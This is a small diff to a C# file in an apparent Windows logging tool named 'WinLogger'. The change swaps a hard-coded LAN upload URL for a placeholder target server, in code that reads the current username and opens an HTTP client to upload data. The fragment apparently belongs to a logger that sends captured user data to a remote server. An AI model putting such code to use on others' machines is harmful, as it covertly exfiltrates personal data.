@@ -234,7 +234,7 @@ namespace WinLogger
             try
             {
                 string username = Environment.UserName;
-                string url = "http://192.168.5.13/pclog/upload.php";
+                string url = "YOUR_TARGET_WEB_SERVER_IP/FOLDER_NAME/upload.php";
 
                 using (HttpClient client = new HttpClient())
                 {
